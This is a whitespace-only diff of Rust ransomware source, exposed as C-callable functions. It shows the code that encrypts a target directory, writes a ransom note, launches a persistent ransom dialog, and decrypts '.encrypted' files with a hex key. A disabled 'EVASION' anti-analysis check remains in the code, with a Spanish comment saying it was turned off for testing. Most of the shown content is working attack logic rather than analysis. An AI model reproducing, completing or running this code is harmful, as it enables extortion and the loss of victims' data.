@@ -64,40 +64,40 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             if path.is_null() {
                 return CString::new("ERROR:Null path provided").unwrap().into_raw();
             }
-            
+
             // EVASION: Check for debugging/analysis environment
           //  if !evasion::should_execute() {
           //      return CString::new("ERROR:Environment check failed").unwrap().into_raw();
           //  }
-           // desactivo esto con propositos de prueba 
+           // desactivo esto con propositos de prueba
             let c_str = std::ffi::CStr::from_ptr(path);
             let path_str = match c_str.to_str() {
                 Ok(s) => s,
                 Err(_) => return CString::new("ERROR:Invalid UTF-8 in path").unwrap().into_raw(),
             };
-            
+
             let target_path = Path::new(path_str);
             if !target_path.exists() {
                 return CString::new(format!("ERROR:Directory '{}' does not exist", path_str))
                     .unwrap().into_raw();
             }
-            
+
             // Generate encryption key
             let key = crypto::generate_key();
             let key_hex = hex_encode(&key);
-            
+
             // Discover files
             let depth = if max_depth == 0 { None } else { Some(max_depth as usize) };
             let files = fileops::discover_files(target_path, depth);
-            
+
             if files.is_empty() {
                 return CString::new("ERROR:No files to encrypt in this directory")
                     .unwrap().into_raw();
             }
-            
+
             // Show progress dialog (non-blocking, just notification)
             let _ = ransom_dialog::show_encryption_progress_dialog(files.len());
-            
+
             // Encrypt files
             let mut encrypted_count = 0;
             for file in &files {
@@ -105,23 +105,23 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
                     encrypted_count += 1;
                 }
             }
-            
+
             // Create ransom note
             let _ = fileops::create_ransom_note(target_path, &key_hex);
-            
+
             // Show persistent ransom dialog in a separate thread (non-blocking)
             // This allows the function to return immediately while the dialog persists
             let key_for_thread = key_hex.clone();
             std::thread::spawn(move || {
                 let _ = ransom_dialog::show_ransom_dialog(&key_for_thread);
             });
-            
+
             // Return key immediately (dialog runs in background)
             CString::new(format!("KEY:{}:ENCRYPTED:{}", key_hex, encrypted_count))
                 .unwrap().into_raw()
         }
     });
-    
+
     match result {
         Ok(ptr) => ptr,
         Err(_) => {
@@ -165,40 +165,40 @@ pub extern "C" fn decrypt_directory(
             if path.is_null() || key_hex.is_null() {
                 return CString::new("ERROR:Null parameter provided").unwrap().into_raw();
             }
-            
+
             let path_c_str = std::ffi::CStr::from_ptr(path);
             let path_str = match path_c_str.to_str() {
                 Ok(s) => s,
                 Err(_) => return CString::new("ERROR:Invalid UTF-8 in path").unwrap().into_raw(),
             };
-            
+
             let key_c_str = std::ffi::CStr::from_ptr(key_hex);
             let key_str = match key_c_str.to_str() {
                 Ok(s) => s,
                 Err(_) => return CString::new("ERROR:Invalid UTF-8 in key").unwrap().into_raw(),
             };
-            
+
             let target_path = Path::new(path_str);
             if !target_path.exists() {
                 return CString::new(format!("ERROR:Directory '{}' does not exist", path_str))
                     .unwrap().into_raw();
             }
-            
+
             // Parse key from hex
             let key_bytes = match hex_decode(key_str) {
                 Ok(bytes) => bytes,
                 Err(e) => return CString::new(format!("ERROR:Invalid key format: {}", e))
                     .unwrap().into_raw(),
             };
-            
+
             if key_bytes.len() != 32 {
                 return CString::new("ERROR:Key must be 32 bytes (64 hex characters)")
                     .unwrap().into_raw();
             }
-            
+
             let mut key = [0u8; 32];
             key.copy_from_slice(&key_bytes);
-            
+
             // Discover encrypted files
             let depth = if max_depth == 0 { None } else { Some(max_depth as usize) };
             let all_files = fileops::discover_all_files(target_path, depth);
@@ -206,12 +206,12 @@ pub extern "C" fn decrypt_directory(
                 .iter()
                 .filter(|f| f.to_str().unwrap_or("").ends_with(".encrypted"))
                 .collect();
-            
+
             if encrypted_files.is_empty() {
                 return CString::new("ERROR:No encrypted files found")
                     .unwrap().into_raw();
             }
-            
+
             // Decrypt files
             let mut success_count = 0;
             for file in encrypted_files {
@@ -219,12 +219,12 @@ pub extern "C" fn decrypt_directory(
                     success_count += 1;
                 }
             }
-            
+
             CString::new(format!("OK:Decrypted {} files", success_count))
                 .unwrap().into_raw()
         }
     });
-    
+
     match result {
         Ok(ptr) => ptr,
         Err(_) => {
@@ -281,20 +281,20 @@ pub extern "C" fn show_persistent_ransom_dialog(correct_key: *const c_char) -> *
             if correct_key.is_null() {
                 return CString::new("ERROR:Null key provided").unwrap().into_raw();
             }
-            
+
             let key_c_str = std::ffi::CStr::from_ptr(correct_key);
             let key_str = match key_c_str.to_str() {
                 Ok(s) => s,
                 Err(_) => return CString::new("ERROR:Invalid UTF-8 in key").unwrap().into_raw(),
             };
-            
+
             match ransom_dialog::show_ransom_dialog(key_str) {
                 Ok(_) => CString::new("OK:User entered correct key").unwrap().into_raw(),
                 Err(e) => CString::new(format!("ERROR:{}", e)).unwrap().into_raw(),
             }
         }
     });
-    
+
     match result {
         Ok(ptr) => ptr,
         Err(_) => {
@@ -346,16 +346,16 @@ fn hex_decode(s: &str) -> Result<Vec<u8>, String> {
     if s.len() % 2 != 0 {
         return Err("Hex string must have even length".to_string());
     }
-    
+
     let mut result = Vec::with_capacity(s.len() / 2);
     let mut chars = s.chars();
-    
+
     while let (Some(h), Some(l)) = (chars.next(), chars.next()) {
         let high = hex_char_to_value(h)?;
         let low = hex_char_to_value(l)?;
         result.push((high << 4) | low);
     }
-    
+
     Ok(result)
 }
 
